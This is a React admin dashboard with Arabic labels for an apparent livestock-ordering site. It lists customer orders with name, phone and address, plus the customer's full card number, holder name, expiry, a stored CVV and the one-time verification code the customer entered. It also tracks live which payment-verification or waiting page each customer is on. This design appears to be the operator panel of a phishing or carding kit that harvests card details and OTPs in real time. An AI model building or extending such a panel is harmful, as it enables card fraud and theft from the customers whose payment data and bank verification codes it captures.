import { useState, useEffect, useMemo } from 'react';
import { useListAdminOrders } from '@workspace/api-client-react';
import { User, CreditCard, Shield, FileText, ChevronRight, Phone, MapPin, Calendar, RefreshCw, Wifi, WifiOff } from 'lucide-react';
import { LoadingBlock, ErrorBlock } from '../shared';
import { usePresence } from '@/hooks/usePresence';

type CustomerTab = 'info' | 'summary' | 'payment' | 'verification';

function formatCardNumber(num: string | undefined | null) {
  if (!num) return '---';
  return num.replace(/(.{4})/g, '$1 ').trim();
}

function getPaymentMethodLabel(method: string | undefined) {
  return method === 'cash_on_delivery' ? 'دفع عند الاستلام' : 'دفع الآن';
}

function getPageDisplayName(path: string): string {
  const pageNames: Record<string, string> = {
    '/': 'الصفحة الرئيسية',
    '/products': 'المنتجات',
    '/order': 'طلب جديد',
    '/summary': 'ملخص الطلب',
    '/payment': 'صفحة الدفع',
    '/payment-verification': 'تحقق الدفع',
    '/payment-waiting': 'انتظار الدفع',
    '/payment-rejected': 'رفض الدفع',
    '/thank-you': 'شكراً لك',
    '/about': 'من نحن',
    '/contact': 'اتصل بنا',
    '/sign-in': 'تسجيل الدخول',
    '/sign-up': 'إنشاء حساب',
    '/admin': 'لوحة التحكم',
  };
  return pageNames[path] || path;
}

export function CustomersAdmin() {
  const { data: orders, isLoading, isError, refetch } = useListAdminOrders();
  const [selectedCustomerId, setSelectedCustomerId] = useState<number | null>(null);
  const [activeTab, setActiveTab] = useState<CustomerTab>('info');
  
  // Real-time presence from WebSocket
  const { presenceClients, isConnected } = usePresence();

  const ordersList = Array.isArray(orders) ? orders : [];

  // Set first order as selected when data loads
  useEffect(() => {
    if (ordersList.length > 0 && selectedCustomerId === null) {
      setSelectedCustomerId(ordersList[0].id);
    }
  }, [ordersList, selectedCustomerId]);

  // Listen for data updates
  useEffect(() => {
    const handleUpdate = () => {
      refetch();
    };
    window.addEventListener('mawashi-data-update', handleUpdate);
    return () => window.removeEventListener('mawashi-data-update', handleUpdate);
  }, [refetch]);

  const selectedOrder = ordersList.find(o => o.id === selectedCustomerId);
  
  // Match presence clients with orders by orderId (primary) or customerName (fallback)
  const ordersWithPresence = useMemo(() => {
    return ordersList.map((order) => {
      // First try to match by orderId
      let presence = presenceClients.find((p) => p.orderId === order.id);
      
      // Fallback: match by customer name
      if (!presence) {
        presence = presenceClients.find(
          (p) => p.customerName && p.customerName === order.customerName
        );
      }
      
      return {
        ...order,
        currentPage: presence?.currentPage || null,
        isOnline: presence?.isOnline || false,
        lastSeenAt: presence?.lastSeenAt || null,
      };
    });
  }, [ordersList, presenceClients]);

  const InfoSection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-gray-50 p-4">
        <div className="flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
          <User className="h-6 w-6 text-primary" />
        </div>
        <div>
          <h3 className="font-bold text-lg">{selectedOrder.customerName}</h3>
          <p className="text-sm text-muted-foreground">طلب رقم {selectedOrder.id}</p>
        </div>
      </div>

      <div className="grid gap-3">
        <div className="flex items-center gap-3 rounded-lg border p-3">
          <Phone className="h-5 w-5 text-muted-foreground" />
          <div>
            <p className="text-xs text-muted-foreground">رقم الهاتف</p>
            <p className="font-medium" dir="ltr">{selectedOrder.phone}</p>
          </div>
        </div>

        <div className="flex items-center gap-3 rounded-lg border p-3">
          <MapPin className="h-5 w-5 text-muted-foreground" />
          <div>
            <p className="text-xs text-muted-foreground">عنوان التوصيل</p>
            <p className="font-medium">{selectedOrder.address}</p>
          </div>
        </div>

        <div className="flex items-center gap-3 rounded-lg border p-3">
          <Calendar className="h-5 w-5 text-muted-foreground" />
          <div>
            <p className="text-xs text-muted-foreground">تاريخ الطلب</p>
            <p className="font-medium">{selectedOrder.pickupDate}</p>
          </div>
        </div>
      </div>
    </div>
  ) : null;

  const SummarySection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
        <FileText className="h-6 w-6 text-primary" />
        <div>
          <h3 className="font-bold">ملخص الطلب</h3>
          <p className="text-sm text-muted-foreground">تفاصيل الطلب #{selectedOrder.id}</p>
        </div>
      </div>

      <div className="rounded-lg border bg-card">
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">المنتج</span>
            <span className="font-medium">{selectedOrder.productName}</span>
          </div>
        </div>
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">العدد</span>
            <span className="font-medium">{selectedOrder.quantity}</span>
          </div>
        </div>
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">تاريخ الاستلام</span>
            <span className="font-medium">{selectedOrder.pickupDate}</span>
          </div>
        </div>
        <div className="border-b p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">طريقة الدفع</span>
            <span className="font-medium">{getPaymentMethodLabel(selectedOrder.paymentMethod)}</span>
          </div>
        </div>
        <div className="p-4">
          <div className="flex justify-between">
            <span className="text-muted-foreground">حالة الدفع</span>
            <span className="rounded-full bg-accent/30 px-3 py-1 text-xs font-bold text-secondary">
              {selectedOrder.paymentStatus === 'paid' ? 'مدفوع' : 
               selectedOrder.paymentStatus === 'pending' ? 'قيد الانتظار' : 'غير مطلوب'}
            </span>
          </div>
        </div>
      </div>
    </div>
  ) : null;

  const PaymentSection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
        <CreditCard className="h-6 w-6 text-primary" />
        <div>
          <h3 className="font-bold">بيانات البطاقة</h3>
          <p className="text-sm text-muted-foreground">معلومات بطاقة الدفع</p>
        </div>
      </div>

      <div className="rounded-lg border bg-card p-6">
        <div className="mb-4 flex items-center justify-between">
          <p className="text-sm text-muted-foreground">رقم البطاقة</p>
          <div className="flex items-center gap-2">
            <span className="font-mono text-sm">{formatCardNumber(selectedOrder.cardNumber)}</span>
            {selectedOrder.cardNumber && <span className="text-green-500">✓</span>}
          </div>
        </div>

        <div className="mb-4 flex items-center justify-between">
          <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
          <span className="text-sm">{selectedOrder.cardName || '---'}</span>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="flex items-center justify-between">
            <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
            <span className="text-sm">{selectedOrder.cardExpiry || '---'}</span>
          </div>

          <div className="flex items-center justify-between">
            <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
            <span className="font-medium" dir="ltr">{selectedOrder.cardCvv ? '***' : '---'}</span>
          </div>
        </div>
      </div>
    </div>
  ) : null;

  const VerificationSection = () => selectedOrder ? (
    <div className="space-y-4">
      <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
        <Shield className="h-6 w-6 text-primary" />
        <div>
          <h3 className="font-bold">رمز التحقق</h3>
          <p className="text-sm text-muted-foreground">كود التحقق من العملية</p>
        </div>
      </div>

      <div className="rounded-lg border bg-card p-6">
        <p className="mb-4 text-center text-sm text-muted-foreground">رمز التحقق المدخل</p>
        {selectedOrder.otpCode ? (
          <>
            <div className="flex justify-center gap-2">
              {selectedOrder.otpCode.split('').map((digit, i) => (
                <div
                  key={i}
                  className="flex h-12 w-10 items-center justify-center rounded-lg border-2 border-green-500/20 bg-green-500/5 text-lg font-bold text-green-600"
                >
                  {digit}
                </div>
              ))}
            </div>
            <p className="mt-4 text-center text-xs text-green-600">✓ تم التحقق بنجاح</p>
          </>
        ) : (
          <div className="flex justify-center">
            <span className="text-muted-foreground">لم يتم إدخال رمز التحقق بعد</span>
          </div>
        )}
      </div>
    </div>
  ) : null;

  const renderContent = () => {
    switch (activeTab) {
      case 'info': return <InfoSection />;
      case 'summary': return <SummarySection />;
      case 'payment': return <PaymentSection />;
      case 'verification': return <VerificationSection />;
      default: return <InfoSection />;
    }
  };

  if (isLoading) return <LoadingBlock label="جاري تحميل البيانات" />;
  if (isError) return <ErrorBlock onRetry={() => void refetch()} />;

  return (
    <div className="flex h-[calc(100vh-140px)] gap-4">
      {/* Customer List Sidebar */}
      <div className="w-72 flex-shrink-0 overflow-hidden rounded-xl border bg-card">
        {/* WebSocket Connection Status */}
        <div className={`flex items-center gap-2 border-b px-4 py-2 text-xs ${
          isConnected 
            ? 'bg-green-50 text-green-700 border-green-200' 
            : 'bg-red-50 text-red-700 border-red-200'
        }`}>
          {isConnected ? (
            <>
              <Wifi className="h-3 w-3" />
              <span>متصل - تحديث فوري</span>
              <span className="ml-auto flex h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
            </>
          ) : (
            <>
              <WifiOff className="h-3 w-3" />
              <span>غير متصل</span>
              <span className="ml-auto flex h-2 w-2 rounded-full bg-gray-400"></span>
            </>
          )}
        </div>
        <div className="flex items-center justify-between border-b p-4">
          <div>
            <h2 className="font-bold">العملاء</h2>
            <p className="text-sm text-muted-foreground">{ordersList.length} طلب</p>
          </div>
          <button
            onClick={() => void refetch()}
            className="rounded-lg p-2 hover:bg-muted"
            title="تحديث"
          >
            <RefreshCw className="h-4 w-4" />
          </button>
        </div>
        <div className="overflow-y-auto p-2">
          {ordersList.length === 0 ? (
            <div className="p-4 text-center text-sm text-muted-foreground">
              لا توجد طلبات حتى الآن
            </div>
          ) : (
            ordersWithPresence.map((order) => (
              <button
                key={order.id}
                onClick={() => {
                  setSelectedCustomerId(order.id);
                  setActiveTab('info');
                }}
                className={`mb-1 flex w-full items-center justify-between rounded-lg p-3 text-right transition-colors ${
                  selectedCustomerId === order.id
                    ? 'bg-primary text-primary-foreground'
                    : 'hover:bg-muted'
                }`}
              >
                <div className="flex items-center gap-3">
                  <div className={`flex h-10 w-10 items-center justify-center rounded-full ${
                    selectedCustomerId === order.id
                      ? 'bg-primary-foreground/20'
                      : 'bg-muted'
                  }`}>
                    <User className="h-5 w-5" />
                  </div>
                  <div className="text-right">
                    <p className="font-medium">{order.customerName}</p>
                    <div className={`flex items-center gap-2 text-xs ${
                      selectedCustomerId === order.id
                        ? 'text-primary-foreground/70'
                        : 'text-muted-foreground'
                    }`}>
                      {order.isOnline ? (
                        <>
                          <span className="flex items-center gap-1 text-green-500">
                            <span className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
                            {getPageDisplayName(order.currentPage || '/')}
                          </span>
                        </>
                      ) : (
                        <>
                          <span className="flex items-center gap-1">
                            <WifiOff className="h-3 w-3" />
                            {order.currentPage ? getPageDisplayName(order.currentPage) : 'غير متصل'}
                          </span>
                        </>
                      )}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {order.isOnline ? (
                    <span className="flex h-2 w-2 rounded-full bg-green-500 animate-pulse"></span>
                  ) : (
                    <span className="flex h-2 w-2 rounded-full bg-gray-400"></span>
                  )}
                  <ChevronRight className={`h-4 w-4 ${
                    selectedCustomerId === order.id ? 'rotate-180' : ''
                  }`} />
                </div>
              </button>
            ))
          )}
        </div>
      </div>

      {/* Content Area */}
      <div className="flex-1 overflow-hidden rounded-xl border bg-card">
        {/* Tabs */}
        <div className="flex gap-1 border-b p-2">
          <button
            onClick={() => setActiveTab('info')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'info'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <User className="h-4 w-4" />
            معلومات العميل
          </button>
          <button
            onClick={() => setActiveTab('summary')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'summary'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <FileText className="h-4 w-4" />
            الملخص
          </button>
          <button
            onClick={() => setActiveTab('payment')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'payment'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <CreditCard className="h-4 w-4" />
            بطاقة الدفع
          </button>
          <button
            onClick={() => setActiveTab('verification')}
            className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === 'verification'
                ? 'bg-primary text-primary-foreground'
                : 'hover:bg-muted'
            }`}
          >
            <Shield className="h-4 w-4" />
            رمز التحقق
          </button>
        </div>

        {/* Tab Content */}
        <div className="overflow-y-auto p-6" style={{ height: 'calc(100% - 65px)' }}>
          {selectedOrder ? (
            renderContent()
          ) : (
            <div className="flex h-full flex-col items-center justify-center text-center">
              <User className="mb-4 h-16 w-16 text-muted-foreground/30" />
              <h3 className="text-lg font-bold text-muted-foreground">اختر عميلاً</h3>
              <p className="mt-2 text-sm text-muted-foreground">
                قم بتحديد عميل من القائمة لعرض التفاصيل
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
